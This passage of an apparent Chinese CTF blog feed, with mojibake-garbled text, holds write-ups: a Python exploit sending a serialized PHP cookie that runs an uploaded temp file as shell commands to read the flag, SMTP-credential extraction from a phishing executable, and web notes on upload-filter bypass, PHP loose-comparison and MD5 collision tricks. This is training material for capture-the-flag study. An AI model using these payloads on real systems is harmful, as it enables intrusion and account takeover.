flag</span></span><br></pre></td></tr></table></figure></li><li><p>æœ€åéœ€è¦è¾“å‡ºæ‰§è¡Œä¸Šè¿°æ–‡ä»¶åè¿”å›çš„ç»“æœï¼Œéœ€è¦ç”¨åˆ°çš„æ˜¯phpçŸ­æ ‡ç­¾</p>  <center><code>&#60;&#63;&#61;'233';&#63;&#62;</code> ç­‰ä»·äº <code>&#60;&#63;echo '233';&#63;&#62;</code></center></li></ul><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                  echoçš„å¿«æ·ç”¨æ³•ï¼Œä½†é¡»åœ¨php.inié‡Œæ‰“å¼€short_open_tag</span></span><br><span class="line"><span class="comment">#                                          |</span></span><br><span class="line"><span class="comment">#                                          |   å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›</span></span><br><span class="line"><span class="comment">#                                          â†“                 â†“</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">git = <span class="string">&#x27;O:6:&quot;github&quot;:1:&#123;s:3:&quot;cmd&quot;;s:26:&quot;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                                            â†‘</span></span><br><span class="line"><span class="comment">#                                     æ‰§è¡Œåé¢è·¯å¾„ä¸‹çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">git = base64.b64encode(git.encode()).decode()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;git&#x27;</span>: git&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                æ‰“å¼€æ ¹ç›®å½•ä¸‹å…¨éƒ¨æ–‡ä»¶å¹¶æ˜¾ç¤ºåœ¨æ ‡å‡†è¾“å‡º</span></span><br><span class="line"><span class="comment">#                             |</span></span><br><span class="line"><span class="comment">#                             |   æŸ¥æ‰¾å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">#                             â†“      â†“</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&quot;#!/bin/sh\ncat /* | grep flag&quot;</span>&#125;</span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                 â†‘         â†‘       â†‘</span></span><br><span class="line"><span class="comment">#                 |       æ¢è¡Œç¬¦   pipeï¼Œä»¥å‰é¢çš„è¿”å›ä½œä¸ºå‚æ•°æ¥æ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œç›¸å½“äºåœ¨æ ¹ç›®å½•é‡Œæ‰¾flag </span></span><br><span class="line"><span class="comment">#                 |</span></span><br><span class="line"><span class="comment">#      #!æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è¡¨ç¤ºç¬¦ï¼Œå…¶åè·Ÿç€è§£é‡Šæ­¤è„šæœ¬çš„shellè·¯å¾„</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">a = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;è€ƒå¯Ÿphpä»£ç å®¡è®¡ï¼Œä¸´æ—¶æ–‡ä»¶çª—å£æœŸçš„åˆ©ç”¨ï¼Œä»¥åŠlinuxæŒ‡ä»¤çš„æŒæ¡ï¼Œå¯¹æˆ‘å¥½éš¾ï¼Œè¿˜å¥½æœ‰&lt;code&gt;blackWatch&lt;/code&gt;çš„wpå’ŒååŠ©&lt;/p&gt;
&lt;p&gt;ï¼ˆæ®è¯´æ˜¯æŸåŸé¢˜æ¬è¿ï¼Œç¢äºé¢˜é‡å¤ªå°‘è€Œæ²¡æœ‰æ‰¾åˆ°åŸé¢˜åœ¨å“ªï¼Œä½†æ˜¯è¿™ä¸é‡è¦&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://kyriota.github.io/tags/Web/"/>
    
    <category term="wp" scheme="https://kyriota.github.io/tags/wp/"/>
    
    <category term="miniL" scheme="https://kyriota.github.io/tags/miniL/"/>
    
  </entry>
  
  <entry>
    <title>bugku ç¤¾å·¥-åˆæ­¥æ”¶é›†</title>
    <link href="https://kyriota.github.io/2021/03/24/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/"/>
    <id>https://kyriota.github.io/2021/03/24/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/</id>
    <published>2021-03-23T16:40:39.000Z</published>
    <updated>2021-05-14T10:31:52.800Z</updated>
    
    <content type="html"><![CDATA[<p>è™½ç„¶å’ŒWebå…¶å®æ²¡ä»€ä¹ˆå…³ç³»ï¼Œä½†æ˜¯çœŸçš„æ˜¯éå¸¸æœ‰è¶£å•ŠğŸ‘</p><p align='right'><small>ä½œè€…è¯´è¿™ä¸ªé¢˜æ›´åƒæ˜¯MISCç±»...yysyï¼Œqs</small></p><span id="more"></span><h1 id="ç¤¾å·¥-åˆæ­¥æ”¶é›†"><a href="#ç¤¾å·¥-åˆæ­¥æ”¶é›†" class="headerlink" title="ç¤¾å·¥-åˆæ­¥æ”¶é›†"></a>ç¤¾å·¥-åˆæ­¥æ”¶é›†</h1><h2 id="ç½‘é¡µåˆ†æ"><a href="#ç½‘é¡µåˆ†æ" class="headerlink" title="ç½‘é¡µåˆ†æ"></a>ç½‘é¡µåˆ†æ</h2><ul><li><p>è¿›æ¥å‘ç°æ˜¯åˆ·é’»è½¯ä»¶çš„indexï¼Œå…¶ä¸­æœ‰ä¸€åœ°å€å¯ä»¥ä¸‹è½½ä¸€ä¸ªæ˜“è¯­è¨€å†™çš„exe</p><p>  <img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-index.PNG"></p></li><li><p>æ‰‹åŠ¨æ·»åŠ adminå‘ç°ç®¡ç†é¡µé¢å­˜åœ¨ï¼Œä½†æ˜¯ä¸€æ—¦å°è¯•æ³¨å…¥å°±ä¼šå¡æ­»(è‡³å°‘æˆ‘æ˜¯è¿™æ ·çš„)</p></li></ul><p>è‡³æ­¤ï¼Œå…¶ä»–çš„ä¿¡æ¯å‡ä¸ºå¹²æ‰°ï¼Œå†æ²¡æœ‰å‘ç°ä»»ä½•çº¿ç´¢ï¼Œå¾ˆæ˜¾ç„¶åˆ·é’»exeæ‰æ˜¯å…³é”®</p><h2 id="exeåˆ†æ"><a href="#exeåˆ†æ" class="headerlink" title="exeåˆ†æ"></a>exeåˆ†æ</h2><h3 id="æ–¹æ³•ä¸€ï¼šæŠ“smtpåŒ…"><a href="#æ–¹æ³•ä¸€ï¼šæŠ“smtpåŒ…" class="headerlink" title="æ–¹æ³•ä¸€ï¼šæŠ“smtpåŒ…"></a>æ–¹æ³•ä¸€ï¼šæŠ“smtpåŒ…</h3><p>å…ˆçœ‹æœ¬ä½“ï¼Œå°±æ˜¯ä¸€ä¸ªé’“é±¼è½¯ä»¶</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-exe.PNG"></p><p>æœ€ç®€å•ä¹Ÿæ˜¯æœ€å¸¸è§çš„é’“é±¼å°±æ˜¯ç”¨smtpå‘é‚®ä»¶å‡ºå»ï¼Œä½†åœ¨é€šè¿‡smtpé€ä¿¡æ—¶æ˜¯éœ€è¦smtpæˆæƒç çš„ï¼Œæ•…åªè¦æŠ“ä¸ªsmtpåŒ…çœ‹é‚®ç®±å’Œå¯†ç å³å¯</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-pack.PNG"></p><p>å…³é”®å­—<code>AUTH LOGIN</code>ç™»å½•è®¤è¯ï¼Œå°†ä¸‹æ–‡çš„å‘é€çš„å­—æ®µb64decodeä¸€ä¸‹ï¼Œå¾—åˆ°é‚®ç®±ä¸å¯†ç </p><h3 id="æ–¹æ³•äºŒï¼šIDA"><a href="#æ–¹æ³•äºŒï¼šIDA" class="headerlink" title="æ–¹æ³•äºŒï¼šIDA"></a>æ–¹æ³•äºŒï¼šIDA</h3><p>é™¤äº†æŠ“åŒ…æŸ¥çœ‹é‚®ç®±ä¸å¯†ç ï¼Œåœ¨exeä¸­çš„é‚®ç®±å’Œå¯†ç ä¹Ÿæ˜¯ä¿å­˜ä¸ºé™æ€å­—æ®µçš„ï¼Œæ‹–è¿›IDAå»å­—ç¬¦ä¸²é¡µé¢æ‰¾å³å¯</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-IDA.PNG"></p><h2 id="ç™»å½•é‚®ç®±"><a href="#ç™»å½•é‚®ç®±" class="headerlink" title="ç™»å½•é‚®ç®±"></a>ç™»å½•é‚®ç®±</h2><p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬æ‰¾åˆ°çš„æ˜¯smtpæˆæƒç ï¼Œè€Œéé‚®ç®±çš„ç™»é™†å¯†ç ï¼Œæ•…ä¸èƒ½åœ¨ç½‘æ˜“é‚®ç®±ç›´æ¥ç™»å½•ï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯è™½ç„¶çŸ¥é“smtpæˆæƒç å’Œç™»é™†å¯†ç æ˜¯ä¸¤ç äº‹ï¼Œä½†æ˜¯è¿˜æ˜¯è¯•äº†å¥½ä¹…ï¼‰ï¼Œé¢å‘æœç´¢å¼•æ“è§£é¢˜æˆ‘ä»¬å¾—çŸ¥åº”è¯¥ç”¨ç¬¬ä¸‰æ–¹çš„é‚®ç®±å®¢æˆ·ç«¯ï¼Œå¹¶é€‰æ‹©ä½¿ç”¨smtpåè®®ç™»å½•ï¼Œä¾‹å¦‚<code>FoxMail</code>ï¼Œç™»å½•åå¯ä»¥æ‰¾åˆ°ç®¡ç†å‘˜è¡¥æ¡£çš„è¢«åˆ é™¤çš„emlæ ¼å¼çš„é™„ä»¶ï¼Œfoxmailæœ¬èº«æˆ–å¾®è½¯è‡ªå¸¦é‚®ç®±å°±å¯ä»¥æ‰“å¼€</p><blockquote>EMLæ ¼å¼æ˜¯å¾®è½¯å…¬å¸åœ¨Outlookä¸­æ‰€ä½¿ç”¨çš„ä¸€ç§éµå¾ªRFC822åŠå…¶åç»­æ‰©å±•çš„æ–‡ä»¶æ ¼å¼ï¼Œå¹¶æˆä¸ºå„ç±»ç”µå­é‚®ä»¶è½¯ä»¶çš„é€šç”¨æ ¼å¼â€”â€”ç™¾åº¦ç™¾ç§‘</blockquote><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-mail.PNG"></p><p>æ‰“å¼€é™„ä»¶åä¸ºé‚®ä»¶å¯¹è¯æˆªå›¾ï¼Œå¥½å¿ƒçš„ç®¡ç†è¿˜ç”»å‡ºäº†å…³é”®ä¿¡æ¯ï¼Œç»“åˆé¢˜ç›®ä¸­æåˆ°â€œç¤¾å·¥â€ï¼Œæ˜¾ç„¶æ­¤å¤„äº¤ä»£äº†åå°ç®¡ç†çš„ç”¨æˆ·åå³ä¸ºå‘ä»¶äººç½²åï¼Œå¯†ç ä¸ºç”Ÿæ—¥å¯†ç ï¼Œä»¥æ­¤ç™»å½•åå°åç¨å¾®ç¿»ç¿»å°±çœ‹åˆ°flagå•¦~</p><p align='right'><small>éå¸¸æœ‰è¶£</small></p><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;è™½ç„¶å’ŒWebå…¶å®æ²¡ä»€ä¹ˆå…³ç³»ï¼Œä½†æ˜¯çœŸçš„æ˜¯éå¸¸æœ‰è¶£å•ŠğŸ‘&lt;/p&gt;
&lt;p align=&#39;right&#39;&gt;&lt;small&gt;ä½œè€…è¯´è¿™ä¸ªé¢˜æ›´åƒæ˜¯MISCç±»...yysyï¼Œqs&lt;/small&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://kyriota.github.io/tags/Web/"/>
    
    <category term="wp" scheme="https://kyriota.github.io/tags/wp/"/>
    
    <category term="bugku" scheme="https://kyriota.github.io/tags/bugku/"/>
    
  </entry>
  
  <entry>
    <title>Web Basic Requirement</title>
    <link href="https://kyriota.github.io/2021/03/16/Web_Basic_Requirement/"/>
    <id>https://kyriota.github.io/2021/03/16/Web_Basic_Requirement/</id>
    <published>2021-03-16T08:33:52.000Z</published>
    <updated>2021-05-06T11:28:26.958Z</updated>
    
    <content type="html"><![CDATA[<p>ç³»ç»Ÿæ€§æ”¶å½•è§£å†³Webé¢˜ç›®éœ€è¦çš„å‰ç½®çŸ¥è¯†ï¼Œè¿‡äºé›¶ç¢çš„çŸ¥è¯†æœªæ•´åˆ</p><span id="more"></span><hr><h1 id="PHP-amp-HTTP"><a href="#PHP-amp-HTTP" class="headerlink" title="PHP&amp;HTTP"></a><big><center>PHP&amp;HTTP</center></big></h1><p align="right"><small>PHP is the best language in the world</small></p><h2 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie,session,token"></a><big>cookie,session,token</big></h2><p>è¿™ä¸‰ä¸ªä¸œè¥¿çš„æœ€åŸºæœ¬çš„ç›®çš„éƒ½æ˜¯åŒºåˆ†ç”¨æˆ·ï¼Œæ ‡è¯†èº«ä»½ï¼Œå½¢å¼ä¸åŒè€Œå·²</p><ul><li><p>cookieï¼šå°é¥¼å¹²ï¼ŒæŒ‰F12å°±å¯ä»¥æ‰¾åˆ°å½“å‰é¡µé¢å­˜æ”¾çš„cookieï¼Œæœ¬åœ°ç¼“å­˜ï¼Œç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œåœ¨ä¸‹æ¬¡è¯·æ±‚æ—¶åˆå‘å›æœåŠ¡å™¨ã€‚ç”±äºcookieæ˜¯å­˜åœ¨å®¢æˆ·ç«¯ä¸Šçš„ï¼Œæ‰€ä»¥æµè§ˆå™¨åŠ å…¥äº†ä¸€äº›é™åˆ¶ç¡®ä¿cookieä¸ä¼šè¢«æ¶æ„ä½¿ç”¨ï¼ŒåŒæ—¶ä¸ä¼šå æ®å¤ªå¤šç£ç›˜ç©ºé—´ï¼Œæ‰€ä»¥æ¯ä¸ªåŸŸçš„cookieæ•°é‡æ˜¯æœ‰é™çš„ã€‚ç”±äºcookieæ˜¯äººä¸ºè®¾ç½®çš„ï¼Œæ‰€ä»¥cookieä¸­å¯èƒ½è—æœ‰é¢˜ç›®çš„hint</p></li><li><p>sessionï¼šä¼šè¯ï¼ŒæœåŠ¡ç«¯ä¸´æ—¶ç¼“å­˜ç”¨æˆ·çš„æ•°æ®ï¼Œç”¨æˆ·ç¦»å¼€ç½‘ç«™åç«‹å³é”€æ¯ï¼Œpython requestsä¸­å°±æœ‰ä¿ç•™ä¼šè¯çš„æ–¹æ³•</p></li></ul><p><img src="/images/session.jpg"></p><ul><li>tokenï¼šå› ä¸ºå½“ç”¨æˆ·æ›´æ¢è®¿é—®çš„æœåŠ¡å™¨æ—¶ï¼Œè‹¥sessionæ²¡æœ‰åŒæ­¥åˆ°ä½ï¼Œåˆ™ç”¨æˆ·åˆéœ€è¦é‡æ–°ç™»é™†ï¼Œtoken å°±è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚å®ƒå°†çŠ¶æ€ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”å€ŸåŠ©åŠ å¯†ç®—æ³•è¿›è¡ŒéªŒè¯ä¿è¯å®‰å…¨æ€§</li></ul><p><img src="/images/token.jpg"></p><h2 id="HEADER"><a href="#HEADER" class="headerlink" title="HEADER"></a><big>HEADER</big></h2><p>å“åº”å¤´ï¼Œæ˜¯æœåŠ¡å™¨ä»¥HTTPåè®®ä¼ HTMLèµ„æ–™åˆ°æµè§ˆå™¨å‰æ‰€é€å‡ºçš„å­—ä¸²ï¼Œä¾¿äºæå‰åˆ¤æ–­æ˜¯å¦æ¥å—è¯·æ±‚ä»¥åŠè¯·æ±‚çš„å¤§è‡´ä¿¡æ¯ä¸å±æ€§ï¼ŒæŒ‰F12å°±å¯ä»¥æŸ¥çœ‹å½“å‰é¡µé¢çš„HEADERï¼ŒHEADERå¯ä»¥è‡ªå®šä¹‰ï¼Œå¯èƒ½åŒ…å«äº†é¢˜ç›®çš„hint</p><p>å…¶ä¸­æœ‰å‡ ä¸ªé‡è¦çš„HEADERéœ€è¦äº†è§£</p><ul><li><code>X-Forwarded-for</code>ï¼šXFFå¤´ï¼Œå«HTTPè¯·æ±‚ç«¯çš„IPï¼Œä½†å½“ä»…ä½¿ç”¨è¿™ä¸€å“åº”å¤´æ¥éªŒè¯è¯·æ±‚æ®µçš„çœŸå®IPæ—¶æ˜¯ä¸å¯é çš„</li><li><code>Referer</code>ï¼šå‘Šè¯‰æœåŠ¡å™¨è¯·æ±‚æ¥è‡ªå“ªä¸ªé“¾æ¥</li><li><code>Content-type</code>ï¼šå†…å®¹ç±»å‹ï¼Œç”¨äºå®šä¹‰ç½‘ç»œæ–‡ä»¶çš„ç±»å‹å’Œç½‘é¡µçš„ç¼–ç ï¼Œå†³å®šæ–‡ä»¶æ¥æ”¶æ–¹å°†ä»¥ä»€ä¹ˆå½¢å¼ã€ä»€ä¹ˆç¼–ç è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸­å¸¸é€šè¿‡æ›´æ”¹æ­¤ headerä¼ªé€ æ–‡ä»¶ç±»å‹æ ‡è¯†ï¼Œè¯·æ±‚å¤´éƒ¨ä¸­çš„Content-typeå¯ç”¨å¤§å°å†™ç»•è¿‡ï¼Œå¦‚Content-Type: multipart/form-data;æ›¾åœ¨ä¸€ä¸ªé¢˜ç›®ä¸­å°† multipartä¸­çš„éƒ¨åˆ†å­—æ¯æ”¹ä¸ºå¤§å†™å³å¯ä¸Šä¼ æ–‡ä»¶ï¼›è€Œè¯·æ±‚æ•°æ®ä¸­çš„Content-typeåˆ™ç›´æ¥å¤åˆ¶ç²˜è´´å³å¯ï¼Œä¸åŒçš„åç¼€åå‡æœ‰å¯¹åº”çš„æè¿°ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­æˆªåŒ…åä¿®æ”¹Content-typeå¤´ï¼Œå¹¶åˆ©ç”¨PHPä¸ä»…å¯ä»¥è§£æ.PHPæ–‡ä»¶ï¼ŒåŒ…æ‹¬.PHP2~.PHP5åç¼€çš„æ–‡ä»¶PHPéƒ½å¯ä»¥è§£æï¼Œæ¥ç»•è¿‡å¯¹.PHPåç¼€çš„è¿‡æ»¤ï¼Œå¹¶æˆåŠŸä¸Šä¼ </li></ul><img src="/images/WebshellUpload.png" style="zoom: 67%;" /><h2 id="PHPæ ‡ç­¾å†™æ³•"><a href="#PHPæ ‡ç­¾å†™æ³•" class="headerlink" title="PHPæ ‡ç­¾å†™æ³•"></a><big>PHPæ ‡ç­¾å†™æ³•</big></h2><p>â€‹    æœ‰æ—¶å¸¸è§çš„ phpæ ‡ç­¾ä¼šè¢«è¿‡æ»¤æ‰ï¼Œè¿™å°±éœ€è¦å°è¯•æ›´æ¢å…¶ä»–æ ‡ç­¾æ¥è¿›è¡Œå°è¯•</p><p>â€‹    &lt;?php echo â€˜hiâ€™; ?&gt;  æ ‡å‡†å†™æ³•</p><p>â€‹    &lt;script language=â€phpâ€&gt; echo 1; &lt;/script&gt;  é•¿æ ‡ç­¾å†™æ³•ï¼Œåœ¨ php7.0åå°±ä¸è§£æäº†</p><h2 id="æ¾æ•£æ¯”è¾ƒ"><a href="#æ¾æ•£æ¯”è¾ƒ" class="headerlink" title="æ¾æ•£æ¯”è¾ƒ"></a><big>æ¾æ•£æ¯”è¾ƒ</big></h2><p>PHPä¸­çš„æ¯”è¾ƒåˆ†ä¸ºå¼±æ¯”è¾ƒï¼ˆ==ï¼Œ!=ï¼‰ä¸å¼ºæ¯”è¾ƒï¼ˆ===ï¼Œ!==ï¼‰ä¸¤ç§æ–¹å¼ï¼Œå› ä¸ºPHPä¸­çš„å˜é‡ä¸ç”¨å£°æ˜å…¶æ•°æ®ç±»å‹ï¼Œå¯¼è‡´äº†åœ¨å¼±æ¯”è¾ƒä¸­çš„é€‚åº”æ€§å˜åŒ–</p><img src="/images/PHPå¼±æ¯”è¾ƒè¡¨.png" style="zoom: 50%;" /><p>éœ€è¦è¡¥å……çš„æ˜¯æ•°å­—ä¸å­—ç¬¦ä¸²çš„å¼±æ¯”è¾ƒï¼Œåœ¨è¿›è¡Œè¿™ç±»æ¯”è¾ƒæ—¶ï¼Œä¼šå…ˆå°è¯•å°†å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—ï¼Œè½¬æ¢è§„åˆ™ä¸ºï¼šè‹¥ä¸ºéæ•°å­—å¼€å¤´ï¼Œåˆ™è½¬æ¢ä¸º<code>0</code>ï¼Œè‹¥ä¸ºæ•°å­—å¼€å¤´ï¼Œåˆ™è½¬æ¢ä¸ºå¼€å¤´çš„æ•°å­—ï¼Œä»¥ä¸‹ä¸ºç¤ºä¾‹ï¼š</p><center><code>"abd"---0</code></center><center><code>"123abc"---123</code></center><center><code>"123.456abc"---123.456</code></center><center><code>"123e4abc"---123e4</code></center><center><code>"233a233"---233</code></center><p>è¿™æ ·çš„æ¯”è¾ƒï¼Œå°¤å…¶æ˜¯å­—ç¬¦ä¸²è½¬æ•°å­—æ—¶ç§‘å­¦è®¡æ•°æ³•çš„è¯†åˆ«ï¼Œä¸ºmd5çš„ç»•è¿‡åŸ‹ä¸‹ä¼ç¬”</p><p>è€Œå¼ºæ¯”è¾ƒä¼šå…ˆåˆ¤æ–­æ•°æ®ç±»å‹æ˜¯å¦ä¸€è‡´ï¼Œåœ¨è‹¥ä¸€è‡´æ‰è¿›è¡Œå¯¹å€¼çš„åˆ¤æ–­ï¼Œå¦åˆ™ç›´æ¥è¿”å›false</p><h2 id="MD5ç¢°æ’ä¸ç»•è¿‡"><a href="#MD5ç¢°æ’ä¸ç»•è¿‡" class="headerlink" title="MD5ç¢°æ’ä¸ç»•è¿‡"></a><big>MD5ç¢°æ’ä¸ç»•è¿‡</big></h2><p>MD5ç ç”±<code>32</code>ä¸ªå­—æ¯æˆ–æ•°å­—ç»„æˆï¼Œå› å…¶ç¢°æ’æ¦‚ç‡ç›¸å¯¹è¾ƒå¤§ï¼Œç°å·²æ˜¯ä¸€ç§ä¸å¤ªå¯é çš„Hashç®—æ³•ã€‚é’ˆå¯¹PHPä¸­çš„å¼±æ¯”è¾ƒï¼Œå¼ºæ¯”è¾ƒï¼Œä»¥åŠmd5()å‡½æ•°çš„ç‰¹æ€§ï¼Œæœ‰å‡ ç§å¸¸ç”¨çš„ç»•è¿‡æ–¹å¼ã€‚</p><ul><li><p>MD5å¼±æ¯”è¾ƒï¼š0eå¼€å¤´ä¼šè¢«è¯†åˆ«ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œ<code>md5(aabg7XSs)</code>ä¸ <code>md5(QNKCDZO)</code>çš„è¿”å›å€¼å‡ä¸º 0eå¼€å¤´</p></li><li><p>MD5ä¸SHA1æ•°ç»„ç»•è¿‡ï¼šMD5()ä¸SHA1()éƒ½ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œç›¸å½“äºè¿”å›äº†NULLï¼Œè™½ç„¶ä¼šäº§ç”ŸWARNINGï¼Œä½†å®ƒä¼šç»§ç»­æ‰§è¡Œå•Šï¼Œäºæ˜¯å°±è¿™ä¹ˆç»•è¿‡äº†ï¼Œç”šè‡³éª—è¿‡å¼ºç­‰äºã€‚è‡³äºä¼ å‚ï¼Œå†™æˆï¼ša[]=233&amp;b[]=Oopså³å¯</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">233</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&quot;Oops&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$a</span>)===md5(<span class="variable">$b</span>))</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;it s ok&#x27;</span>;</span><br></pre></td></tr></table></figure>  <blockquote>[Out]<br>it s ok</blockquote></li></ul><ul><li><p>MD5ç¢°æ’ï¼šæœ€ç»å…¸çš„æ˜¯è¿™ä¸¤ä¸²16è¿›åˆ¶å­—ç¬¦ä¸²</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexString1</span>=<span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;</span>;</span><br><span class="line"><span class="variable">$hexString2</span>=<span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;</span>;</span><br><span class="line"></span><br><span class="line">hex2bin(<span class="variable">$hexString1</span>)===hex2bin(<span class="variable">$hexString2</span>);<span class="comment">//False</span></span><br><span class="line">md5(hex2bin(<span class="variable">$hexString1</span>))===md5(hex2bin(<span class="variable">$hexString2</span>));<span class="comment">//True</span></span><br><span class="line"><span class="comment">//éƒ½æ˜¯008ee33a9d58b51cfeb425b0959121c9</span></span><br><span class="line"><span class="comment">//hex2bin()ï¼Œåå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè¦æ±‚php version&gt;=5.4</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="è¶…å…¨å±€å˜é‡"><a href="#è¶…å…¨å±€å˜é‡" class="headerlink" title="è¶…å…¨å±€å˜é‡"></a><big>è¶…å…¨å±€å˜é‡</big></h2><p>ä¹‹æ‰€ä»¥å«åšè¶…å…¨å±€å˜é‡ï¼Œæ˜¯å› ä¸ºå®ƒä»¬åœ¨ä¸€ä¸ªè„šæœ¬çš„å…¨éƒ¨ä½œç”¨åŸŸä¸­éƒ½å¯ç”¨ï¼Œå¸¸è§çš„è¶…å…¨å±€å˜é‡æœ‰ï¼š</p><center><code>$_GET,$_POST,$_REQUEST,$GLOBALSç­‰</code></center><ul><li><p>GETä¼ å‚æ–¹å¼ä¸ºåœ¨urlååŠ  <code>/?var_name=value</code>ï¼Œæ³¨æ„éœ€è¦urlç¼–ç </p></li><li><p>POSTä¼ å‚æ–¹å¼ä¸ºé¡µé¢å†…æäº¤è¡¨å•æˆ–ç”¨curlï¼Œpython requestsï¼Œhackbarç­‰å·¥å…·ï¼Œé€šå¸¸ä¸ç”¨è¿›è¡Œurlç¼–ç å†ä¼ è¾“ï¼Œå–å†³äºHTTP HEADERä¸­çš„â€Content-Typeâ€œï¼Œè‹¥ä¸ºâ€œmultipart/form-dataâ€åˆ™ä¸éœ€è¦ï¼Œè‹¥ä¸ºâ€œapplication/x-www-form-urlencodedâ€åˆ™éœ€è¦</p></li><li><p>REQUESTçš„ä¼ å‚æ–¹å¼åŒ…æ‹¬GETå’ŒPOST</p></li><li><p>$GLOBALS[index] ä½œä¸ºæ•°ç»„ï¼Œå­˜å‚¨äº†æ‰€æœ‰å…¨å±€å˜é‡ï¼Œå˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„indexï¼ŒåŒ…æ‹¬ä¹‹å‰è¯´åˆ°çš„$_GETï¼Œ$_POSTï¼Œä»¥åŠ 